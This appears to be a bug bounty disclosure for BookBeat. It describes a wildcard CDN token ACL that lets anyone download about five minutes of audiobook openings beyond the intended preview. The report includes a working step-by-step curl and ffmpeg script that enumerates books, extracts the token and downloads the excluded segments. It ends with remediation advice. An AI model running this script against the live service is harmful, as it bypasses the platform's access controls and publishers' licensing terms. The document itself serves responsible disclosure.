# W-002 — HLS Token Wildcard ACL Exposes Audiobook Opening (BookBeat)

**Program:** BookBeat Public Bug Bounty (YesWeHack)  
**Asset:** `prod-bb-streaming.akamaized.net`  
**Severity:** Medium — CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` = **5.3**  
**CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)  
**Testing date:** 2026-05-18

---

## TL;DR

BookBeat's audiobook preview system generates Akamai EdgeAuth tokens with an overly broad ACL (`/api/previewstream/book/hlsv4/{bookId}/*`) that grants access to every path under a book's preview directory. The official HLS playlist serves only 3 segments (~30 seconds, starting mid-book at segment 000024). But the same CDN token — obtained freely without any account — authorizes access to 30 sequential segments (~5 minutes), starting at segment 000000: the actual book opening that BookBeat deliberately excluded from the preview.

This is a business logic error in BookBeat's own Akamai EdgeAuth library.

---

## Discovery Process

### 1. Mapping the preview flow

BookBeat offers a "free preview" on many audiobooks. Opening a book's page makes a public API call to `edge.bookbeat.com/api/books/46/{bookId}` that returns, among other fields, a `previewurl` pointing to an HLS master playlist on the CDN.

### 2. Examining the HLS token

Fetching the master playlist returned a URL containing a `bbt=` parameter — BookBeat's Akamai EdgeAuth token. I decoded its structure:

```
exp=<unix_timestamp>~acl=/api/previewstream/book/hlsv4/{bookId}/*~hmac=<sig>
```

The `acl` field was a wildcard: `.../{bookId}/*`. This means the token grants access to **every path** under that book's streaming directory — not just the paths in the official playlist.

### 3. Checking what the playlist actually served

The official playlist served exactly 3 segments, starting at `000024`:

```
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-MEDIA-SEQUENCE:24
#EXTINF:10.007811,
segments/{isbn}/000024?bbt=...
#EXTINF:9.984589,
segments/{isbn}/000025?bbt=...
#EXTINF:10.007800,
segments/{isbn}/000026?bbt=...
#EXT-X-ENDLIST
```

Segments 000000–000023 were absent. The media sequence starting at 24 was deliberate — BookBeat intentionally excluded the book opening from the preview.

### 4. Testing whether earlier segments were accessible

With the same CDN token in hand, I manually requested segment 000000:

```bash
curl -sI "https://prod-bb-streaming.akamaized.net/api/previewstream/book/hlsv4/{bookId}/segments/{isbn}/000000?bbt=..."
```

Response: `HTTP/2 200 content-type: video/mp2t content-length: 136300`

The wildcard ACL made every segment accessible.

### 5. Finding the boundary

I iterated until finding the cutoff:
- Segments 000000–000029: HTTP 200
- Segment 000030: HTTP 404

That's 30 segments × ~10 seconds = ~300 seconds. I verified by concatenating them with ffmpeg: `294 seconds (4m54s)` of playable AAC audio at standard audiobook quality (44.1 kHz stereo, ~98 kbps).

### 6. Confirming it's systematic

I repeated on a second book (`bookId 86330`). Same wildcard ACL, same accessible range (000000–000029), same boundary (000030 → 404). Platform-wide pattern, not an edge case.

---

## Vulnerability

BookBeat maintains their own Akamai EdgeAuth library ([github.com/BookBeat/EdgeAuth-Token-CSharp](https://github.com/BookBeat/EdgeAuth-Token-CSharp)), confirming the token generation is their code, not a CDN default.

The token ACL should enumerate only the specific segment paths in the official playlist. Instead, the backend generates a wildcard that grants access to every segment under the book's directory.

| Property | Value |
|----------|-------|
| Authentication required | None |
| Subscription required | None |
| Designed preview | 3 segments × ~10s ≈ 30 seconds (mid-book, not the opening) |
| Actual accessible | 30 segments × ~10s ≈ 5 minutes (verified: 294s) |
| Overage | 10× the intended content |
| Content | Book opening (Chapter 1) — deliberately excluded from the playlist |
| Encryption | None — MPEG-TS segments have no `#EXT-X-KEY` |

---

## Steps to Reproduce

```bash
# Step 1: Get the preview URL for any book (public API, no auth)
BOOK_ID="86333"
PREVIEW_URL=$(curl -s "https://edge.bookbeat.com/api/books/46/${BOOK_ID}?v=20" \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['previewurl'])")

# Step 2: Fetch the HLS master playlist and extract the token
PLAYLIST_URL=$(curl -s "$PREVIEW_URL" | grep "https://" | head -1)
BBT=$(echo "$PLAYLIST_URL" | grep -oP 'bbt=[^"]+')

# Step 3: Inspect ACL in the token
echo "$BBT"
# → bbt=exp=...~acl=/api/previewstream/book/hlsv4/86333/*~hmac=...
#                                                          ^^^ wildcard

# Step 4: The playlist starts at segment 000024 (book opening deliberately skipped)
curl -s "$PLAYLIST_URL" | grep "segments"
# → segments/{isbn}/000024?bbt=...
# → segments/{isbn}/000025?bbt=...
# → segments/{isbn}/000026?bbt=...

# Step 5: Request segment 000000 (book opening — not in playlist)
BASE="https://prod-bb-streaming.akamaized.net/api/previewstream/book/hlsv4/${BOOK_ID}/segments"
ISBN="[BOOK_ISBN]"
curl -sI "${BASE}/${ISBN}/000000?${BBT}"
# → HTTP/2 200  content-type: video/mp2t  content-length: 136300

# Step 6: Find the boundary
curl -sI "${BASE}/${ISBN}/000029?${BBT}"   # → HTTP/2 200
curl -sI "${BASE}/${ISBN}/000030?${BBT}"   # → HTTP/2 404

# Step 7: Download and verify 30 accessible segments
mkdir /tmp/bb_poc && cd /tmp/bb_poc
for i in $(seq 0 29); do
  SEG=$(printf "%06d" $i)
  curl -s "${BASE}/${ISBN}/${SEG}?${BBT}" -o "seg_${SEG}.ts"
done
cat $(ls -v seg_*.ts) > combined.ts
ffprobe -v quiet -show_entries format=duration,size -of csv=p=0 combined.ts
# → 294.114795,3675957
# 294 seconds (4m54s) of AAC audiobook audio — Chapter 1
```

---

## Impact

Any unauthenticated user or automated script can:

1. Enumerate preview URLs from the public `edge.bookbeat.com/api/books/46/{id}` endpoint.
2. Obtain a valid Akamai token at no cost — the CDN issues it freely.
3. Download the first ~5 minutes of any previewed audiobook starting from Chapter 1, at 10× the intended preview duration.
4. Produce a playable, unencrypted audio file using standard open-source tools (ffmpeg).

The segments are unencrypted (no `#EXT-X-KEY` in the playlist), so the extracted audio plays directly in any media player without decryption or a BookBeat account.

This weakens BookBeat's content licensing model with publisher partners, who license preview rights for specific durations. Providing 10× the licensed preview content — including the book opening deliberately excluded from the design — may breach those licensing agreements.

---

## Remediation

**Primary fix:** Restrict the Akamai EdgeAuth ACL to only the exact segment paths included in the official playlist. For a 3-segment preview at offsets 000024–000026, the ACL should reference only those paths — not a wildcard.

**Defense in depth:** Enable AES-128 segment encryption (`#EXT-X-KEY`) on preview endpoints. Even if the ACL boundary is misconfigured, audio cannot be played without the decryption key.

The root fix is in the token generation logic in the BookBeat EdgeAuth library: the ACL value should be path-specific, not a wildcard.

---

## Lessons Learned

- **"Preview" features often have their own CDN auth layer** separate from the main authentication — always inspect the token structure.
- **HLS playlists can deliberately omit segments while those segments remain accessible at the CDN.** The playlist is a suggestion; the CDN token is the actual gate.
- **Wildcard ACLs in signed token systems are almost always wrong.** Any token that grants `/*` is granting more than the issuer intends.
- **The `#EXT-X-MEDIA-SEQUENCE` field in an HLS playlist is a signal.** When it starts at 24 instead of 0, the missing segments 0–23 are worth probing.
- **Reproducibility across two books** instantly elevated this from "edge case" to "platform-wide." Always confirm a second instance before reporting.
